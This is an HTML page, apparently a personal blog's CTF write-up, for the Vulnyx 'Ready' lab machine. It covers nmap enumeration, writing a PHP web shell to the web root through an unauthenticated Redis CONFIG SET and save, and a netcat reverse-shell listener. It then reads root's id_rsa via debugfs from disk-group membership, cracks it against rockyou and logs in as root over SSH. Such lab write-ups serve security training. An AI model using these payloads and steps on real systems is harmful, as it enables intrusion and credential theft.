@@ -1,0 +1,645 @@
+<!DOCTYPE HTML>
+<html lang="es">
+
+<!-- Web Site diseñada y programada por ShellDredd -->
+
+<!--      .-----.
+   .' -   - '.
+  /  .-. .-.  \
+  |  | | | |  |     ShellDredd Society
+   \ \o/ \o/ /       -The cyber side-
+  _/    ^    \_
+ | \  '---'  / |
+ / /`--. .--`\ \
+/ /'---` `---'\ \
+'.__.       .__.'
+    `|     |`
+     |     \
+     \      '--.
+      '.        `\
+        `'---.   |
+           ,__) /
+            `..' -->
+	
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+    <meta http-equiv="cache-control" content="no-cache"/>
+    <link rel="profile" href="https://gmpg.org/xfn/11" />
+    <meta name="robots" content="index,follow" />
+    <meta name="description" contant="Writeup Ready Machine | Vulnyx Platform" />
+    <meta name="keywords" content="shelldredd, writeup ready machine ctf vulnyx, vulnyx vulnerable machines, vulnyx platform, linux, gnu linux,"/>
+    <!-- Twitter Card data -->
+    <meta name="twitter:card" value="summary">
+    <meta property="og:title" content="Writeup Ready Machine | Vulnyx Platform" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://shelldredd.github.io/writeup/ready-writeup-vulnyx.html" />
+    <meta property="og:image" content="https://vulnyx.github.io/assets/logo.png" />
+    <meta property="og:description" content="Writeup of the first ctf machine of the vulnyx platform, an easy level machine." />
+    <!-- Open Graph data -->
+    <meta property="og:title" content="Writeup Ready Machine | Vulnyx Platform" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://shelldredd.github.io/writeup/ready-writeup-vulnyx.html" />
+    <meta property="og:image" content="https://vulnyx.github.io/assets/logo.png" />
+    <meta property="og:description" content="Writeup of the first ctf machine of the vulnyx platform, an easy level machine." />
+	
+    <meta rel="canonical" href="https://shelldredd.github.io/" />
+    <meta name="author" content="ShellDredd" />
+    <meta name="copyright" content="ShellDredd" />
+    <meta name="robots" content="index,follow">
+
+    
+    <link  rel="icon"   href="../images/logo-rosa.png" type="image/jpeg" sizes="16x16" />
+    <link href="../css/maquillaje2.css" rel="stylesheet">
+
+    <title>ShellDredd Writeup</title>
+
+</head>
+
+
+<!--Menu-->
+
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
+
+
+<nav>
+  <div class="wrapper">
+    <div class="logo"><a href="#"><img class="logo-menu" src="../images/logo-text-shelldredd.jpeg"></a></div>
+    <input type="radio" name="slider" id="menu-btn">
+    <input type="radio" name="slider" id="close-btn">
+    <ul class="nav-links">
+      <label for="close-btn" class="btn close-btn"><i class="fas fa-times"></i></label>
+
+      <li>
+          <a href="#" class="desktop-item">Menú</a>
+          <input type="checkbox" id="showMega">
+          <label for="showMega" class="mobile-item">Menú</label>
+          <div class="mega-box">
+            <div class="content">
+              <div class="row">
+                <img src="../images/ciber3.gif" alt="">
+              </div>
+              <div class="row">
+                <header>Artículos</header>
+                <ul class="mega-links">
+                  <li><a href="../blog.html">Ver tabla general</a></li>
+                  <li><a href="../linux.html">Linux</a></li>
+                  <li><a href="../windows.html">Windows</a></li>
+                  <li><a href="../redes.html">Redes</a></li>
+                  <li><a href="../herramientas.html">Programación</a></li>
+                </ul><br>
+
+                <header>Tools / Software</header>
+                <ul class="mega-links">
+                  <li><a href="https://github.com/shellDredd/" target="_blank">Tools Seguridad</a></li>
+                  <li><a href="https://github.com/offshellsystem" target="_blank">Software para Linux</a></li>
+                </ul>
+              
+                
+              </div>
+              <div class="row">
+                <header>Seguridad Informática</header>
+                <ul class="mega-links">
+                  <li><a href="../maquinas-ctf.html">Laboratorios / VM CTF</a></li>
+                  <li><a href="../writesup.html">Writeups</a></li>
+                  <li><a href="../seguridad.html">Artículos Técnicos</a></li>
+                </ul>
+                <br><br><br>
+                
+
+              <header>Comunidad</header>
+                <ul class="mega-links">
+                  <li><a href="https://discord.gg/jnzGsYdBkm" target="_blank">Discord</a></li>
+                </ul>
+              </div>
+              <div class="row">
+                <header>Contenido Multimedia</header>
+                <ul class="mega-links">
+                  <li><a href="https://www.twitch.tv/shelldredd" target="_blank">🔴Twitch (Directos)</a></li>
+                  <li><a href="https://www.youtube.com/@ShellDreddInformatica" target="_blank">▶️ShellDredd Informática</a></li>
+                  <li><a href="https://www.youtube.com/@shelldreddlive7715" target="_blank">▶️ShellDreddLive</a></li>
+                  <li><a href="#"></a></li>
+                </ul><br><br><br>
+                <header>Sígueme en redes</header>
+                <ul class="mega-links">
+                  <li><a href="../onlyfans-shelldredd.html">OnlyFans</a></li>
+                  <li><a href="https://twitter.com/ShellDredd">Twitter</a></li>
+                  
+                </ul>
+              </div>
+            </div>
+          </div>
+          <li><a href="../index.html">Home</a></li>
+    </ul>
+    <label for="menu-btn" class="btn menu-btn"><i class="fas fa-bars"></i></label>
+  </div>
+</nav>
+
+<body class="body-horizontal">
+
+    <div class="portada-kitty"></div>
+  </div>
+
+
+<div class="bloque-texto">
+
+  <h2 class="title-blog">Writeup READY CTF Machine | <a href="https://vulnyx.github.io/" class="boton-dificultad-writeup-h1">Vulnyx</a> <img src="https://vulnyx.github.io/assets/logo.png" width="25px"> Platform</h2><br>
+
+    <div>
+        <ul>
+          <li>✪ Difficulty of the machine: <a><span class="boton-dificultad-writeup">Easy</span></a></li>
+          <li>✪ Intrusion through configuration failure in REDIS service.</li>
+          <li>✪ System scaling through permissions per group pertaining to disks.</li>
+        </ul>
+      </div><br>
+
+      <h2>Download and virtualization of the machine.</h2><br>
+    <p class="texto-parrafo">On this platform the machines are downloaded in OVA format for VirtualBox virtualization
+         software. Once downloaded, it is decompressed and imported to run the virtualization of the machine and work
+          with it in a local network.<br><br>
+        
+          <input type="checkbox" id="img-articulos-click"/>
+          <label class="img-articulos" for="img-articulos-click"><img class="img-articulos" src="../images/Captura1.JPG"/></label>
+          <br><br>
+
+    <h2>Recognition of services exposed to the network.</h2><br>
+      <p class="texto-parrafo">The first thing is to know the ip of the device/machine. This section is not necessary
+         because as you can see in the previous image, it is available at machine startup.<br><br>
+        <!-- Terminal block -->
+    <div class="terminal">
+        <div class="terminal__head">
+        <div class="terminal__controls">
+            <div class="terminal__button terminal__button--close"></div>
+            <div class="terminal__button terminal__button--minimise"></div>
+            <div class="terminal__button terminal__button--maximise"></div>
+        </div>
+        <div class="terminal__title">
+            <h1 class="terminal__title-text">Commands Terminal</h1>
+        </div>
+        </div>
+        <div class="terminal__body">
+        <div class="terminal__code">Code:bash
+        <code class="terminal__code-language">
+        <ul class="terminal__commands-list">
+            <li class="terminal__command terminal__command--input">$ sudo arp-scan -l | grep "PCS"<br>
+                192.168.1.61 &nbsp; 08:00:27:e2:7f:91 &nbsp; PCS Systemtechnik GmbH</li>
+        </ul>
+        </code><br>
+        I save the machine's IP in an environment variable in bash for ease of use.
+        <code class="terminal__code-language">
+        <ul class="terminal__commands-list">
+            <li class="terminal__command terminal__command--input">$ ip = 192.168.1.61</li>
+        </ul>
+        </code>
+        <code class="terminal__code-language">
+            <ul class="terminal__commands-list">
+                <li class="terminal__command terminal__command--input">$ echo $ip<br> 192.168.1.61</li>
+            </ul>
+            </code>
+        </p>  
+        </div>
+    </div>
+    </div><br>
+          <input type="checkbox" id="img-articulos-click2"/>
+          <label class="img-articulos" for="img-articulos-click2"><img class="img-articulos" src="../images/Captura2.JPG"/></label>
+          <br><br>
+          Now I proceed with the methodology of enumeration of services exposed to the network through ports,
+           for this I use nmap with a first quick scan and once I know the open ports, I perform a scan with
+            more aggressive parameterization to extract information and version of the services found.<br><br>
+          <!-- Terminal block -->
+    <div class="terminal">
+        <div class="terminal__head">
+        <div class="terminal__controls">
+            <div class="terminal__button terminal__button--close"></div>
+            <div class="terminal__button terminal__button--minimise"></div>
+            <div class="terminal__button terminal__button--maximise"></div>
+        </div>
+        <div class="terminal__title">
+            <h1 class="terminal__title-text">Commands Terminal</h1>
+        </div>
+        </div>
+        <div class="terminal__body">
+        <div class="terminal__code">Code:bash
+        <code class="terminal__code-language">
+        <ul class="terminal__commands-list">
+            <li class="terminal__command terminal__command--input">$ sudo nmap -sT -n -Pn --min-rate=4500 -p- $ip --open </li>
+        </ul>
+        </code>  
+        </p>  
+        </div>
+    </div>
+    </div><br>
+
+      <input type="checkbox" id="img-articulos-click3"/>
+      <label class="img-articulos" for="img-articulos-click3"><img class="img-articulos" src="../images/Captura3.JPG"/></label>
+      <br><br>
+
+      <!-- Terminal block -->
+    <div class="terminal">
+        <div class="terminal__head">
+        <div class="terminal__controls">
+            <div class="terminal__button terminal__button--close"></div>
+            <div class="terminal__button terminal__button--minimise"></div>
+            <div class="terminal__button terminal__button--maximise"></div>
+        </div>
+        <div class="terminal__title">
+            <h1 class="terminal__title-text">Commands Terminal</h1>
+        </div>
+        </div>
+        <div class="terminal__body">
+        <div class="terminal__code">Code:bash
+        <code class="terminal__code-language">
+        <ul class="terminal__commands-list">
+            <li class="terminal__command terminal__command--input">$ nmap -sCV -p22,80,6379,8080 $ip -oG nmap-report </li>
+        </ul>
+        </code>  
+        </p>  
+        </div>
+    </div>
+    </div><br>
+
+      <input type="checkbox" id="img-articulos-click4"/>
+      <label class="img-articulos" for="img-articulos-click4"><img class="img-articulos" src="../images/Captura4.JPG"/></label>
+      <br><br>
+
+      <h2>Conclusions of the enumeration.</h2><br>
+
+      <p class="texto-parrafo">
+        I get a web service with the default template of the apache web server manager, a proxy server also managed by apache,
+         a ssh network application and a REDIS service.<br><br>
+        
+        <input type="checkbox" id="img-articulos-click5"/>
+        <label class="img-articulos" for="img-articulos-click5"><img class="img-articulos" src="../images/Captura5.JPG"/></label><br><br>
+        
+        <input type="checkbox" id="img-articulos-click6"/>
+        <label class="img-articulos" for="img-articulos-click6"><img class="img-articulos" src="../images/Captura6.JPG"/></label><br><br>
+
+        After fuzzing the two web services and checking the ssh network location, I can't find anything,
+         so I continue the investigation with the REDIS service.<br><br></p>
+
+    <h2>Exploitation of the REDIS service.</h2><br>
+    <p class="texto-parrafo">
+        I list the version and information with the script and parameter that Nmap provides for the Redis service.
+    </p><br>
+
+    <!-- Terminal block -->
+    <div class="terminal">
+        <div class="terminal__head">
+        <div class="terminal__controls">
+            <div class="terminal__button terminal__button--close"></div>
+            <div class="terminal__button terminal__button--minimise"></div>
+            <div class="terminal__button terminal__button--maximise"></div>
+        </div>
+        <div class="terminal__title">
+            <h1 class="terminal__title-text">Commands Terminal</h1>
+        </div>
+        </div>
+        <div class="terminal__body">
+        <div class="terminal__code">Code:bash
+        <code class="terminal__code-language">
+        <ul class="terminal__commands-list">
+            <li class="terminal__command terminal__command--input">$ nmap -p 6379 $ip --script redis-info </li>
+        </ul>
+        </code>
+        </p>  
+        </div>
+    </div>
+    </div><br>
+
+          <input type="checkbox" id="img-articulos-click7"/>
+          <label class="img-articulos" for="img-articulos-click7"><img class="img-articulos" src="../images/Captura8.JPG"/></label><br><br>
+          <p class="texto-parrafo">
+          The steps to follow to enumerate REDIS are based on testing the remote connection to the service and observing
+          what information and data are stored in memory as well as what commands of the REDIS service itself are
+           available from the user by default without authentication.</p><br>
+
+    <!-- Terminal block -->
+    <div class="terminal">
+      <div class="terminal__head">
+      <div class="terminal__controls">
+          <div class="terminal__button terminal__button--close"></div>
+          <div class="terminal__button terminal__button--minimise"></div>
+          <div class="terminal__button terminal__button--maximise"></div>
+      </div>
+      <div class="terminal__title">
+          <h1 class="terminal__title-text">Commands Terminal</h1>
+      </div>
+      </div>
+      <div class="terminal__body">
+      <div class="terminal__code">Code:bash
+      <code class="terminal__code-language">
+      <ul class="terminal__commands-list">
+          <li class="terminal__command terminal__command--input">$ redis-cli -h 192.168.1.61 -p 6379<br>
+          192.168.1:6379> ping<br>
+          pong<br>
+          192.168.1:6379> acl list 
+          </li>
+      </ul>
+      </code>
+      </p>  
+      </div>
+  </div>
+  </div><br>
+
+    <input type="checkbox" id="img-articulos-click8"/>
+    <label class="img-articulos" for="img-articulos-click8"><img class="img-articulos" src="../images/Captura10.JPG"/></label><br><br>
+
+<!-- Terminal block -->
+<div class="terminal">
+  <div class="terminal__head">
+  <div class="terminal__controls">
+      <div class="terminal__button terminal__button--close"></div>
+      <div class="terminal__button terminal__button--minimise"></div>
+      <div class="terminal__button terminal__button--maximise"></div>
+  </div>
+  <div class="terminal__title">
+      <h1 class="terminal__title-text">Commands Terminal</h1>
+  </div>
+  </div>
+  <div class="terminal__body">
+  <div class="terminal__code">Code:bash
+  <code class="terminal__code-language">
+  <ul class="terminal__commands-list">
+      <li class="terminal__command terminal__command--input"> 192.168.1:6379> info 
+      </li>
+  </ul>
+  </code>
+  </p>  
+  </div>
+</div>
+</div><br>
+
+<input type="checkbox" id="img-articulos-click9"/>
+<label class="img-articulos" for="img-articulos-click9"><img class="img-articulos" src="../images/Captura11.JPG"/></label><br><br>
+
+
+  <!-- Terminal block -->
+<div class="terminal">
+  <div class="terminal__head">
+  <div class="terminal__controls">
+      <div class="terminal__button terminal__button--close"></div>
+      <div class="terminal__button terminal__button--minimise"></div>
+      <div class="terminal__button terminal__button--maximise"></div>
+  </div>
+  <div class="terminal__title">
+      <h1 class="terminal__title-text">Commands Terminal</h1>
+  </div>
+  </div>
+  <div class="terminal__body">
+  <div class="terminal__code">Code:bash
+  <code class="terminal__code-language">
+  <ul class="terminal__commands-list">
+      <li class="terminal__command terminal__command--input"> 192.168.1:6379> config get * 
+      </li>
+  </ul>
+  </code>
+  </p>  
+  </div>
+</div>
+</div><br>
+
+<input type="checkbox" id="img-articulos-click10"/>
+<label class="img-articulos" for="img-articulos-click10"><img class="img-articulos" src="../images/Captura12.JPG"/></label><br><br>
+
+  <p class="texto-parrafo">
+    From the Redis in-memory information I find nothing interesting so I check the existing RCE vulnerability for this service
+     which is caused by a misconfiguration of permissions when creating directories and file extensions.
+    </p><br>
+    
+  <!-- Terminal block -->
+<div class="terminal">
+  <div class="terminal__head">
+  <div class="terminal__controls">
+      <div class="terminal__button terminal__button--close"></div>
+      <div class="terminal__button terminal__button--minimise"></div>
+      <div class="terminal__button terminal__button--maximise"></div>
+  </div>
+  <div class="terminal__title">
+      <h1 class="terminal__title-text">Commands Terminal</h1>
+  </div>
+  </div>
+  <div class="terminal__body">
+  <div class="terminal__code">Code:bash
+  <code class="terminal__code-language">
+  <ul class="terminal__commands-list">
+      <li class="terminal__command terminal__command--input"> 192.168.1.61:6379> CONFIG SET DIR /var/www/html/ <br>
+        OK<br>
+        192.168.1.61:6379> CONFIG SET dbfilename maritrini.php<br>
+        OK<br>
+        set cmd "&lt;?php system($_GET['cmd']); ?>"<br>
+        OK<br>
+        192.168.1.61:6379> set test "&lt;?php system($_GET['cmd']); ?>"<br>
+        OK<br>
+        192.168.1.61:6379> save<br>
+        OK
+      </li>
+  </ul>
+  </code>
+  </p>  
+  </div>
+</div>
+</div><br>
+
+<input type="checkbox" id="img-articulos-click11"/>
+<label class="img-articulos" for="img-articulos-click11"><img class="img-articulos" src="../images/Captura15.JPG"/></label><br><br>
+
+<p class="texto-parrafo">
+  I check if this PHP file that I have added to the directory has worked and indeed, 
+  I get RCE through the web server but in the one that is mounted with proxy, important detail since, it does not work in the normal web server.
+  </p><br>
+
+<input type="checkbox" id="img-articulos-click12"/>
+<label class="img-articulos" for="img-articulos-click12"><img class="img-articulos" src="../images/Captura16.JPG"/></label><br><br>
+
+<p class="texto-parrafo">
+  I use netcat to generate a reverseshell and get a remote shell on the victim server.
+</p><br>
+
+<!-- Terminal block -->
+<div class="terminal">
+  <div class="terminal__head">
+  <div class="terminal__controls">
+      <div class="terminal__button terminal__button--close"></div>
+      <div class="terminal__button terminal__button--minimise"></div>
+      <div class="terminal__button terminal__button--maximise"></div>
+  </div>
+  <div class="terminal__title">
+      <h1 class="terminal__title-text">Commands Terminal</h1>
+  </div>
+  </div>
+  <div class="terminal__body">
+  <div class="terminal__code">Code:bash
+  <code class="terminal__code-language">
+  <ul class="terminal__commands-list">
+      <li class="terminal__command terminal__command--input">$ nc -lvp 6969 <br>
+        listening on [any] 6969 ... 
+      </li>
+  </ul>
+  </code>
+  </p>  
+  </div>
+</div>
+</div><br>
+
+<input type="checkbox" id="img-articulos-click13"/>
+<label class="img-articulos" for="img-articulos-click13"><img class="img-articulos" src="../images/Captura17.JPG"/></label><br><br>
+
+<input type="checkbox" id="img-articulos-click14"/>
+<label class="img-articulos" for="img-articulos-click14"><img class="img-articulos" src="../images/Captura18.JPG"/></label><br><br>
+
+<p class="texto-parrafo">
+  And here I can see that the user ben is part of a group (disk) and I remember that there is a way to escalate
+   privileges through the debugging of partitions and disks. (Before seeing this, I have eaten a small rabbit hole
+    by d4t4s3c, the creator of the machine, and I will not comment here so that you can enjoy it as I have done).
+</p><br>
+
+<!-- Terminal block -->
+<div class="terminal">
+  <div class="terminal__head">
+  <div class="terminal__controls">
+      <div class="terminal__button terminal__button--close"></div>
+      <div class="terminal__button terminal__button--minimise"></div>
+      <div class="terminal__button terminal__button--maximise"></div>
+  </div>
+  <div class="terminal__title">
+      <h1 class="terminal__title-text">Commands Terminal</h1>
+  </div>
+  </div>
+  <div class="terminal__body">
+  <div class="terminal__code">Code:bash
+  <code class="terminal__code-language">
+  <ul class="terminal__commands-list">
+      <li class="terminal__command terminal__command--input">$ id 
+      </li>
+  </ul>
+  <ul class="terminal__commands-list">
+    <li class="terminal__command terminal__command--input">$ df -h 
+    </li>
+</ul>
+<ul class="terminal__commands-list">
+  <li class="terminal__command terminal__command--input">$ find /dev -group disk 
+  </li>
+</ul>
+  </code>
+  </p>  
+  </div>
+</div>
+</div><br>
+
+<input type="checkbox" id="img-articulos-click15"/>
+<label class="img-articulos" for="img-articulos-click15"><img class="img-articulos" src="../images/Captura22.JPG"/></label><br><br>
+
+<p class="texto-parrafo">
+  Using "debugfs" for the disk from owner root I have access to the whole system inside this binary/cleanup program,
+   I could read the flag from here but that would not be a complete escalation so I decide to read the "id_rsa"
+    credentials found in the /root/.ssh directory to copy them to my machine, crack the protection key and subsequently
+     connect to the victim machine through the SSH application as admin user "root".
+    </p><br>
+
+    <!-- Terminal block -->
+<div class="terminal">
+  <div class="terminal__head">
+  <div class="terminal__controls">
+      <div class="terminal__button terminal__button--close"></div>
+      <div class="terminal__button terminal__button--minimise"></div>
+      <div class="terminal__button terminal__button--maximise"></div>
+  </div>
+  <div class="terminal__title">
+      <h1 class="terminal__title-text">Commands Terminal</h1>
+  </div>
+  </div>
+  <div class="terminal__body">
+  <div class="terminal__code">Code:bash
+  <code class="terminal__code-language">
+  <ul class="terminal__commands-list">
+      <li class="terminal__command terminal__command--input">$ debugfs /dev/sda1<br>
+        debugfs 1.46.2 (28-Feb-2021)<br>
+        debugfs:<br>
+        debugfs: cd /root<br>
+        debugfs: cd .shh<br>
+        debugfs: cat id_rsa
+      </li>
+  </ul>
+  </code>
+  </p>  
+  </div>
+</div>
+</div><br>
+
+<input type="checkbox" id="img-articulos-click16"/>
+<label class="img-articulos" for="img-articulos-click16"><img class="img-articulos" src="../images/Captura27.JPG"/></label><br><br>
+
+<p class="texto-parrafo">
+  To crack the password protection of the id_rsa file I use the <a href="https://github.com/d4t4s3c/RSAcrack" class="boton-dificultad-writeup">"RSAcrack"</a> tool programmed by the same creator of the machine, d4t4s3c, and that you can find in his github repositories.<br>
+  <a href="https://github.com/d4t4s3c/RSAcrack" class="boton-dificultad-writeup">Link to RSAcrack tool on GitHub.</a>
+</p><br>
+
+<input type="checkbox" id="img-articulos-click17"/>
+<label class="img-articulos" for="img-articulos-click17"><img class="img-articulos" src="../images/Captura28.JPG"/></label><br><br>
+
+<p class="texto-parrafo"></p>
+And finally I give permissions to the id_rsa file to then connect remotely as "root" user through the SSH service,
+ getting access as administrator / full privileged user to the victim system.
+</p><br>
+
+<!-- Terminal block -->
+<div class="terminal">
+  <div class="terminal__head">
+  <div class="terminal__controls">
+      <div class="terminal__button terminal__button--close"></div>
+      <div class="terminal__button terminal__button--minimise"></div>
+      <div class="terminal__button terminal__button--maximise"></div>
+  </div>
+  <div class="terminal__title">
+      <h1 class="terminal__title-text">Commands Terminal</h1>
+  </div>
+  </div>
+  <div class="terminal__body">
+  <div class="terminal__code">Code:bash
+  <code class="terminal__code-language">
+  <ul class="terminal__commands-list">
+      <li class="terminal__command terminal__command--input">$ ./RSAcrack.sh -k id_rsa -w /usr/share/wordlists/rockyou.txt 
+      </li>
+  </ul>
+  <ul class="terminal__commands-list">
+    <li class="terminal__command terminal__command--input">$ chmod 600 id_rsa 
+    </li>
+</ul>
+<ul class="terminal__commands-list">
+  <li class="terminal__command terminal__command--input">$ ssh -i id_rsa root@192.168.1.61 
+  </li>
+</ul>
+  </code>
+  </p>  
+  </div>
+</div>
+</div><br>
+
+<input type="checkbox" id="img-articulos-click18"/>
+<label class="img-articulos" for="img-articulos-click18"><img class="img-articulos" src="../images/Captura29.JPG"/></label><br><br>
+
+<input type="checkbox" id="img-articulos-click19"/>
+<label class="img-articulos" for="img-articulos-click19"><img class="img-articulos" src="../images/Captura30.JPG"/></label><br><br>
+
+
+<img src="https://media0.giphy.com/media/1yLTS67dpNJPjD0JlA/giphy.gif?cid=ecf05e473fbpw412crttpqmrbpd12e9zdid160h54rome422&rid=giphy.gif&ct=ts" width="300px">
+
+          <h2>Personal Conclusions</h2><br>
+          An incredible machine and perfect for people who are starting on this beautiful path of cybersecurity and audits,
+           simple but complete, offers great methodologies that force you to look at the details and learn important and
+            basic methods, as well as take a walk through the Redis service, which is found in real environments as well
+             as common proxy servers. In short, a perfect machine to welcome this new platform called
+              <a href="https://vulnyx.github.io/" class="boton-dificultad-writeup">Vulnyx</a>, conceived and created by d4t4s3c, a great among
+               the greats and whom I admire a lot for years for all the teachings
+               he has given me selflessly, a unique user of the network without doubt,<br><br>
+          
+      <br>
+      <h2><img src="https://media1.giphy.com/media/e8vLgKW80EBxLjRWZw/giphy.gif?cid=ecf05e47f7eenjdsnniqqobbe7sqm5ez4v5u8oij6w5oa56l&rid=giphy.gif&ct=s" width="90px">See you in the next article</h2>
+</div>
+
+
+
+
+
+</body>
